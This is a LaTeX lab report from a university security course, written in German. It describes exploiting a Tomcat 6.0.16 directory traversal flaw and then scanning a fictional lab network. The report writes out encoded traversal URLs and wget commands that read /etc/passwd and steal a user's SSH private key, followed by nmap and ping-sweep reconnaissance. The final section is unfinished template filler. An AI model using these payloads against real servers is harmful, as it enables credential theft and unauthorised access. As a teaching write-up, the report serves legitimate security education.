@@ -1,0 +1,464 @@
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%
+% Institut für Rechnergestuetzte Automation
+% Forschungsgruppe Industrial Software
+% Arbeitsgruppe ESSE
+% http://security.inso.tuwien.ac.at/
+% lva.security@inso.tuwien.ac.at
+% 
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\documentclass[12pt,a4paper,titlepage,oneside]{scrartcl}
+\usepackage{esseProtocol}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%
+% FOR STUDENTS
+%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+% Group number or "0" for Lab0
+\newcommand{\gruppe}{5}
+% Date
+\newcommand{\datum}{15.05.2013}
+% valid values: "Lab0", "Lab1" (be sure to use Uppercase for first character)
+\newcommand{\lab}{Lab1}
+
+% name of course, for example: "IT Security in Large IT Infrastructures", "Security for Systems Engineering", "Introduction to Security"
+\newcommand{\lvaname}{Security for Systems Engineering}
+% number of course, for example: "183.633", "183.637", "183.594"
+\newcommand{\lvanr}{183.637}
+% year and term, for example: "SS 2012", "WS 2012", "SS 2013", etc.
+\newcommand{\semester}{SS 2013}
+
+% Group members
+\newcommand{\studentAName}{Florin Bogdan BALINT}
+\newcommand{\studentAMatrnr}{0725439}
+\newcommand{\studentAEmail}{e0725439@student.tuwien.ac.at}
+
+\newcommand{\studentBName}{Tudor-Octav PLES}
+\newcommand{\studentBMatrnr}{0826687}
+\newcommand{\studentBEmail}{e0826687@student.tuwien.ac.at}
+
+\newcommand{\studentCName}{Zoltan KREKUS}
+\newcommand{\studentCMatrnr}{0702077}
+\newcommand{\studentCEmail}{e0702077@student.tuwien.ac.at}
+
+\newcommand{\studentDName}{Simon Georg HECHT}
+\newcommand{\studentDMatrnr}{0926240}
+\newcommand{\studentDEmail}{e0926240@student.tuwien.ac.at}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%
+% DO NOT CHANGE THE FOLLOWING PART
+%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\newcommand{\dokumenttyp}{Abgabedokument \lab}
+
+\begin{document}
+
+\maketitle
+\setcounter{section}{0}
+\setcounter{tocdepth}{2}
+\tableofcontents
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%
+% CONTENT OF DOCUMENT STARTS HERE
+%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\section{Einleitung}
+
+\subsection{Arbeitsumgebung}
+Die Lösung dieser Übung wurde unter mehreren Betriebssystemen erarbeitet. Je nach Beispiel wird eine entsprechende Referenz darauf gemacht, um welchen Betriebssystem es sich handelt. Insgesamt wurden folgende Betriebssysteme für die Lösung der Übungsaufgabe verwendet: Microsoft Windows 7, XUbuntu, MacOS.
+
+\subsection{Verwendete Programme und Quellen}
+Für die meisten Befehele wurden die Manual Einträge unter Linux verwendet, bzw. wurde nach Beispielen im Internet gesucht (via www.google.com) und diese ggf. angepasst. Die konkreten Quellenangaben werden an den entsprechenden Stellen im Dokument bekannt gegeben.
+
+\subsection{Vereinfachte Annahmen}
+Der Einfachheit halber werden wir in diesem Abgabedokument bei den Befehlen auf konkrete Matrikelnummern verzichten und sie mit '0xxxxxx' ersetzten.
+
+\newpage
+
+\section{Lab1a}
+
+\subsection{Login via ssh}
+\noindent
+In der vorherigen Übung wurde erfolgreich eine Verbindung mit dem Server: \emph{sela.inso.tuwien.ac.at}, Port \emph{12345}; Fingerprint: \emph{b3:4a:6f:33:30:5a:db:72:f1:9c:c8:ad:39:a7:1d:f6}, hergestellt.
+
+\noindent
+Nun soll eine ssh-Verbindung auf dem Server mit der IP:\emph{192.168.20.100} und dem Port \emph{8000} für den Benutzer \emph{walter} hergestellt werden. Da wir in diesem Fall die genaue IP-Adresse und den genauen Port im Netzwerk kennen ist ein Port Forwarding sehr empfehlenswert und zwar mittels dem Befehl:
+
+
+\begin{lstlisting}[caption=Port Forwarding - Tomcat Access,label=code:beispiel1,style=simple]
+user:$ ssh 0xxxxxx@sela.inso.tuwien.ac.at -p 12345 -L 2323:192.168.20.100:8000
+\end{lstlisting}
+
+\noindent
+wird was sich auch immer hinter dem Tomcat verbirgt auf den lokalen Host: \emph{localhost} Port \emph{2323} umgeleitet. Wenn man nun einen lokalen Browser aufruft und auf \emph{localhost:2323/} geht erscheint nun im Browser die Meldung 'Welcome to lab1!'.
+
+\noindent
+Um Exploits ausnutzen zu können muss man wissen womit man es zu tun hat. Wenn man ganz einfach eine Seite eintippt die nicht existiert, wie z.B. 
+
+\url{localhost:2323/asdf} 
+
+\noindent
+so kommt eine 'HTTP 404 - NOT FOUND' Fehlermeldung, aber mit ihr auch unten die Apache Tomcat Version: 6.0.16. Nun ist eine (Internet-)Recherche um bekannte Sicherheitslücken dieser Version zu finden angesagt. Z.B.: auf 
+
+\url{http://www.cvedetails.com/} => bekannte Seite für Sicherheitslücken in nahezu allen gängigen Webservern, Datenbanken, Frameworks, Programmiersprachen, etc.
+Liste der Lücken in Apache Tomcat/6.0.16 => 
+
+\url{vulnerability-list/vendor_id-45/product_id-887/version_id-56605/Apache-Tomcat-6.0.16.html}
+
+\noindent
+Da es unser Ziel ist an weitere Zugangsdaten zu kommen suchen wir nach Attacken wie z.b. Directory Traversal, welches sich hierfür ausgezeichnet eignet.
+Tatsächlich finden wir mehrere Einträge zu Sicherheitslücken im Bezug auf Direcory Traversal
+\url{http://www.cvedetails.com/cve/CVE-2008-5515/}
+\url{http://www.cvedetails.com/cve/CVE-2008-2370/}
+\url{https://issues.apache.org/bugzilla/show_bug.cgi?id=45417}
+
+\noindent
+Mittels
+
+
+\url{http://localhost:2323/\%c0\%ae\%c0\%ae/\%c0\%ae\%c0\%ae/\%c0\%ae\%c0\%ae/\%c0\%ae\%c0\%ae/\%c0\%ae\%c0\%ae/etc/passwd}
+
+\noindent
+kann man den kompletten Inhalt der Datei sehen, unter anderem den Eintrag:
+
+
+\emph{walter:x:1000:1000::/home/walter:/bin/bash}. 
+
+\noindent
+Nachdem der Benutzer bekannt kann man den Inhalt des .ssh Verzeichnisses kopieren um eine ssh-Verbindung ohne Kennworteingabe zu ermöglichen. Dazu werden folgende Inhalte der Dateien im lokalen Verzeichnis unter .shh hineinkopiert (Bemerkung: das lokale Verzeichnis wurde davor geleert, sodass nur noch die Schlüssel von Walter sich drinnen befinden. In einem neuen Terminal wurden dann folgende Befehle eingegeben:
+
+
+\begin{lstlisting}[caption=Get the id,label=code:beispiel1,style=simple]
+user:$ wget http://localhost:2323/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/walter/.ssh/id_rsa
+user:$ wget http://localhost:2323/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/walter/.ssh/id_rsa.pub
+user:$ wget http://localhost:2323/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/walter/.ssh/authorized_keys
+\end{lstlisting}
+
+Um eine Verbindung 'als Walter' zu ermöglichen ist es notwendig einen erneuten Port Forwarding (d.h. neuer Terminal) zu machen mittels:
+\begin{lstlisting}[caption=Port Forwarding - Tomcat Access,label=code:beispiel1,style=simple]
+user:$ ssh -p 12345 -l 0xxxxxx -L 2223:192.168.20.100:22 sela.inso.tuwien.ac.at
+\end{lstlisting}
+
+Nun ist es möglich sich als Walter ohne Kennworteingabe anzmelden, dazu wurden folgende Befehle in einem erneuten Terminal eingegeben (zuerst die File Permissions richtig setzen und dann anmelden):
+\begin{lstlisting}[caption=Change File Permissions and Tomcat Access,label=code:beispiel1,style=simple]
+user:$ sudo chmod 600 id_rsa
+user:$ ssh -p 2223 walter@localhost
+\end{lstlisting}
+
+Somit wurde eine erfolgreiche Verbindung 'als Walter' hergestellt.
+
+\newpage
+
+\section{Lab1b}
+Im vorigen Schritt wurde eine erfolgreiche Verbindung mit dem Benutzer 'walter' hergestellt nun sollen mehrere Informationen über das gesamte Firmennetzwerk herausgefunden werden.
+
+\subsection{DNS, IPv4 und IPv6}
+
+\noindent
+Mittels dem Befehl:
+
+\begin{lstlisting}[caption=Nmap Host Discovery,label=code:beispiel1,style=simple]
+user:$ nmap -sP 192.168.20.*
+\end{lstlisting}
+
+\noindent
+werden alle IP-Adressen in dem Bereich 192.168.20.1-255 eingescannt (Nmap wird für sogenannte \emph{host discoveries} verwendet, siehe mehr dazu \url{http://en.wikipedia.org/wiki/Nmap}. Das selbe angewendet auf alle IP Bereiche die man einscannen soll (d.h. 192.168.20.*, 192.168.98.*, 172.16.2.*) gibt dann folgende IPv4 Adressen und DNS Namen zurück:
+
+\begin{tabular}{ l | l }
+\hline
+  - & 192.168.20.100 \\ \hline
+  - & 192.168.20.254 \\ \hline
+omega.local.vienna.essecorp.invalid & 192.168.98.1 \\ \hline
+alpha.local.vienna.essecorp.invalid &	192.168.98.10 \\ \hline
+beta.local.vienna.essecorp.invalid &	192.168.98.28\\ \hline
+gamma.local.vienna.essecorp.invalid	 & 192.168.98.54\\ \hline
+delta.local.vienna.essecorp.invalid	& 192.168.98.99\\ \hline
+tomcat.local.vienna.essecorp.invalid	& 192.168.98.124\\ \hline
+epsilon.local.vienna.essecorp.invalid	& 192.168.98.201\\ \hline
+zeta.local.vienna.essecorp.invalid	& 192.168.98.202\\ \hline
+gemini.dmz.vienna.essecorp.invalid	& 172.16.2.12\\ \hline
+phoenix.dmz.vienna.essecorp.invalid	& 172.16.2.15\\ \hline
+taurus.dmz.vienna.essecorp.invalid	& 172.16.2.25\\ \hline
+lyra.dmz.vienna.essecorp.invalid	& 172.16.2.253\\ \hline
+\end{tabular}
+
+\newpage
+
+\noindent
+Weiterhin interessieren uns die IPv6 Adressen. Diese kann man z.B. mittels dem Befehl nslookup herausfinden:
+
+\begin{lstlisting}[caption=nslookup,style=simple]
+walter@tomcat:~$ nslookup
+> set type=AAAA
+> omega.local.vienna.essecorp.invalid
+Server:		192.168.98.10
+Address:	192.168.98.10#53
+
+omega.local.vienna.essecorp.invalid	has AAAA address fdcb:c447:e9d2:3553:1001::1
+> 
+\end{lstlisting}
+
+\noindent
+Dadurch wurden folgende Informationen gefunden:
+
+\begin{tabular}{ l | l | l}
+\hline
+  - & 192.168.20.100 \\ \hline
+  - & 192.168.20.254 \\ \hline
+omega.local.vienna.essecorp.invalid & 192.168.98.1	& fdcb:c447:e9d2:3553:1001::1 \\ \hline
+alpha.local.vienna.essecorp.invalid &	192.168.98.10   & fdcb:c447:e9d2:3553:1001::5 \\ \hline
+beta.local.vienna.essecorp.invalid &	192.168.98.28	& fdcb:c447:e9d2:3553:1001::9\\ \hline
+gamma.local.vienna.essecorp.invalid	 & 192.168.98.54	& fdcb:c447:e9d2:3553:1001::21\\ \hline
+delta.local.vienna.essecorp.invalid	& 192.168.98.99 & fdcb:c447:e9d2:3553:1001::43\\ \hline
+tomcat.local.vienna.essecorp.invalid	& 192.168.98.124 & fdcb:c447:e9d2:3553:1001::ab \\ \hline
+epsilon.local.vienna.essecorp.invalid	& 192.168.98.201 & fdcb:c447:e9d2:3553:1001::79\\ \hline
+zeta.local.vienna.essecorp.invalid	& 192.168.98.202 & fdcb:c447:e9d2:3553:1001::88\\ \hline
+gemini.dmz.vienna.essecorp.invalid	& 172.16.2.12\\ \hline
+phoenix.dmz.vienna.essecorp.invalid	& 172.16.2.15\\ \hline
+taurus.dmz.vienna.essecorp.invalid	& 172.16.2.25\\ \hline
+lyra.dmz.vienna.essecorp.invalid	& 172.16.2.253 & fdcb:c447:e9d2:3553:1002::fd\\ \hline
+\end{tabular}
+
+\noindent
+Bemerkung: Um zusätzlich nach Maschinen zu suchen, die eventuell nur auf IPv6 laufen wurde ein Skript geschrieben und aufgerufen, der wie folgt ausschaut:
+
+\begin{lstlisting}[caption=Scan IPv6,style=simple]
+walter@tomcat:~$ for num in {1..300} do  ip='fdcb:c447:e9d2:3553:1000::'$(printf "%x" $num) echo "${ip}" ping6 -c 1 -t 1 $ip > /dev/null && echo "${ip} is up";done
+\end{lstlisting}
+\noindent
+Hier wurden die IPv6 Bereiche die vorgegeben wurden eingetippt und es wurden keine zusätzlichen Maschinen gefunden.
+
+\newpage
+
+\subsection{MAC Adressen}
+
+Die MAC Adressen kann man mittels folgendem Befehl aus der Tabelle des Betriebssystems, wo die MAC Adressen der Verbindungen gespeichert werden herausfinden:
+
+\begin{lstlisting}[caption=arp table Connections,style=simple]
+cat /proc/net/arp
+\end{lstlisting}
+
+Dadurch findet man folgende MAC Adressen:
+
+\begin{tabular}{ l | l }
+\hline
+IPv4 &	MAC \\ \hline
+192.168.20.100 &	00:1b:d7:12:bc:51 \\ \hline
+192.168.20.254 &	00:e2:aa:21:c5:d1 \\ \hline
+192.168.98.1 & 	00:1b:d2:0d:84:98 \\ \hline
+192.168.98.10 &	00:1b:d2:d1:1f:85 \\ \hline
+192.168.98.28 &	00:1b:d2:f0:60:59 \\ \hline
+192.168.98.54 &	00:1b:d2:83:b8:41 \\ \hline
+192.168.98.99 &	00:1b:d2:a7:8f:d2 \\ \hline
+192.168.98.124 &	00:1b:d7:12:bc:52 \\ \hline
+192.168.98.201 &	00:1b:d2:38:ae:b9 \\ \hline
+192.168.98.202 &	00:1b:d2:85:9c:c4 \\ \hline
+172.16.2.12	 & - \\ \hline
+172.16.2.15	 & - \\ \hline
+172.16.2.25	 & - \\ \hline
+172.16.2.253	 &-  \\ \hline
+\end{tabular}
+
+\newpage
+
+\subsection{Services}
+Um die offenen Ports und Services heraus zu finden, verwendet man weiterhin den Befehl 'nmap' und zwar:
+
+\begin{lstlisting}[caption=nmap services and ports Connections,style=simple]
+walter@tomcat:~$ nmap 192.168.98.10
+
+Starting Nmap 5.00 ( http://nmap.org ) at 2013-05-15 16:10 CEST
+Interesting ports on alpha.local.vienna.essecorp.invalid (192.168.98.10):
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+53/tcp open  domain
+
+Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
+walter@tomcat:~$ 
+\end{lstlisting}
+
+Dadurch werden folgende Informationen gefunden:
+
+\begin{tabular}{ l | l}
+\hline
+IPv4	& PORTS\\ \hline
+192.168.20.100 & 22/tcp open ssh 8000/tcp open http-alt 8009/tcp open ajp13\\ \hline
+192.168.20.254 &	22/tcp open ssh 873/tcp open rsync\\ \hline
+192.168.98.1 & ALL CLOSED\\ \hline
+192.168.98.10 & 53/tcp open domain dnsmasq 2.55\\ \hline
+192.168.98.28 & 25/tcp open smtp\\ \hline
+192.168.98.54 & 1080/tcp open socks\\ \hline
+192.168.98.99 & 631/tcp open ipp\\ \hline
+192.168.98.124 &	22/tcp open ssh 8000/tcp open http-alt 8009/tcp open ajp13 \\ \hline
+192.168.98.201 &	139/tcp open netbios-ssn 445/tcp open microsoft-ds\\ \hline
+192.168.98.202 &	ALL CLOSED\\ \hline
+172.16.2.12 &	80/tcp open http\\ \hline
+172.16.2.15 &	21/tcp open ftp\\ \hline
+172.16.2.25 &	25/tcp open smtp\\ \hline
+172.16.2.253 &	ALL CLOSED \\ \hline
+\end{tabular}
+
+\newpage
+
+\subsection{Betriebssysteme und Funktionalität}
+\noindent
+Anhand der Services die laufen und den Ports wo sie laufen kann man die Funktionalität der einzelnen Maschinen heraus finden. Die Quelle folgender Angaben ist \url{http://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers}. Das Betriebssystem das gerade auf einer Maschine installiert ist wurde auf zwei Arten ermittelt: einerseits durch das TTL einer PING-Anfrage (Quelle: \url{http://www.map.meteoswiss.ch/map-doc/ftp-probleme.htm}) und andererseits durch den Befehl:
+
+\begin{lstlisting}[caption=nmap OS Connections,style=simple]
+walter@tomcat:~$ nmap -sV -T4 -F 192.168.20.100
+
+Starting Nmap 5.00 ( http://nmap.org ) at 2013-05-15 17:01 CEST
+Interesting ports on 192.168.20.100:
+Not shown: 97 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze3 (protocol 2.0)
+8000/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+8009/tcp open  ajp13?
+Service Info: OS: Linux
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 59.38 seconds
+walter@tomcat:~$ 
+\end{lstlisting}
+
+\newpage
+\noindent
+Dadurch wurden folgende Ergebnisse erzielt:
+
+\begin{tabular}{l|l|l}
+\hline
+IPv4 & 	SERVER USAGE	 & OS\\ \hline
+192.168.20.100	 & apache tomcat server	22/tcp open ssh  & Debian 6+squeeze3 (protocol 2.0)\\ \hline
+192.168.20.254	 & router	22/tcp open ssh OpenSSH 5.5p1  & Debian 6+squeeze1\\ \hline
+192.168.98.1	 & unknown	 & TTL 64 – Linux\\ \hline
+192.168.98.10	 & dns forwarder	 & TTL 64 – Linux\\ \hline
+192.168.98.28	 & e-mail server	 & TTL 64 – Linux\\ \hline
+192.168.98.54	 & proxy	 & TTL 64 – Linux\\ \hline
+192.168.98.99	 & print server	 & TTL 64 – Linux\\ \hline
+192.168.98.124	 & Apache tomcat server	22/tcp & Debian 6+squeeze3 (protocol 2.0)\\ \hline
+192.168.98.201	 & samba server – ordnerfreigabe im netz	 & Windows \\ \hline
+192.168.98.202	 & unknown	 & TTL 63 – Linux\\ \hline
+172.16.2.12	 & web server	 & TTL 63 – Linux\\ \hline
+172.16.2.15	 & ftp server	 & TTL 63 – Linux\\ \hline
+172.16.2.25	 & e-mail server	 & TTL 63 – Linux\\ \hline
+172.16.2.253	 & unknown	 & TTL 64 – Linux\\ \hline
+\end{tabular}
+
+\noindent
+Bei der Maschine 192.168.20.254 handelt es sich um einen Router, da die Adressenvergabe (.254) typisch für einen Cisco Router ist auf der Port 22 verwendet wird, beispielsweise für Konfiguration.
+
+\newpage
+\subsection{Netzwerktopologie}
+Um die Netzwerktopologie aufbauen zu können wurde folgender Befehl für alle Ipv4 Adressen verwendet:
+
+\begin{lstlisting}[caption=nmap OS Connections,style=simple]
+walter@tomcat:~$ tracepath -b 172.16.2.12
+ 1:  tomcat.local.vienna.essecorp.invalid (192.168.98.124)   0.070ms pmtu 1500
+ 1:  omega.local.vienna.essecorp.invalid (192.168.98.1)    0.254ms 
+ 1:  omega.local.vienna.essecorp.invalid (192.168.98.1)    0.144ms 
+ 2:  gemini.dmz.vienna.essecorp.invalid (172.16.2.12)      0.248ms reached
+     Resume: pmtu 1500 hops 2 back 63 
+\end{lstlisting}
+
+Die Topologie schaut wie folgt aus:
+\begin{figure}[h!]
+  \centering
+  \fbox{
+    \includegraphics[width=1.0\textwidth]{./imgs/topology.png}
+  }
+  \caption{Network Topology}
+  \label{fig:logo1}
+\end{figure}
+
+\newpage
+
+\section{Lab1c}
+
+\subsection{Meine Subsection}
+
+Bla
+
+% ! ! !
+% ! ! ! VON HIER AUS BEREINIGEN - ACHTUNG: \end{document} NICHT VERGESSEN ! ! !
+% ! ! !
+
+\newpage
+
+
+
+\section{Ueberschrift 1}
+
+\subsection{Hinweise}
+\emph{Hinweise:}
+\begin{itemize}
+    \item Setzen sie alle Variablen nach \emph{FOR STUDENTS} in der .tex File
+    \item Ersetzen sie die Platzhalter für ihre Namen und MatNr.
+    \item Löschen sie diese Sektion über Hinweise und die folgenden Beispiel-Kapitel
+    \item Achten sie auf geforderte Formate und Anforderungen an die Dateinamen
+\end{itemize}
+
+\subsection{Sub-Ueberschrift 1}
+Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.
+
+\subsection{Sub-Ueberschrift 2}
+Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.
+
+\section{Ueberschrift 2}
+
+\subsection{Sub-Ueberschrift 1}
+Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. 
+
+\subsection{Sub-Ueberschrift 2}
+Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. 
+
+\subsection{Sub-Ueberschrift 3}
+Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. 
+
+\section{Beispiele}
+
+\subsection{Source Code formatieren}
+Es folgen einige Beispiele wie Sourcecode in diesem Dokument formatiert und referenziert werden kann
+(\hyperref[code:beispiel1]{siehe Listing~\ref*{code:beispiel1} auf Seite~\pageref*{code:beispiel1}} und \hyperref[code:beispiel2]{siehe Listing~\ref*{code:beispiel2} auf Seite~\pageref*{code:beispiel2}}).
+
+Ebenso können kurzer Code oder kurze Befehle direkt in der Zeile in einem \lstinline{lstinline Block} mit typengleicher Schrift formatiert werden.
+
+\lstinputlisting[caption=Example C/C++ file,label=code:beispiel1,style=c]{example.c}
+
+\begin{lstlisting}[caption=Example bash script,label=code:beispiel2,style=simple]
+#!/bin/bash
+echo "Bash version ${BASH_VERSION}..."
+for i in {0..10..2}
+  do
+     echo "Welcome $i times"
+ done
+
+echo "some very very very very very very very very very very very very very very very very very very very very long string"
+
+exit 0;
+\end{lstlisting}
+
+\subsection{Bilder}
+
+Es folgen einige Beispiele wie Bilder in diesem Dokument eingefuegt werden koennen
+(\hyperref[fig:logo1]{siehe Abbildung~\ref*{fig:logo1} auf Seite~\pageref*{fig:logo1}}).
+
+\begin{figure}[h!]
+  \centering
+  \fbox{
+    \includegraphics[width=0.4\textwidth]{./imgs/esse-logo-bw.png}
+  }
+  \caption{ESSE Logo}
+  \label{fig:logo1}
+\end{figure}
+
+
+\end{document}
+
+
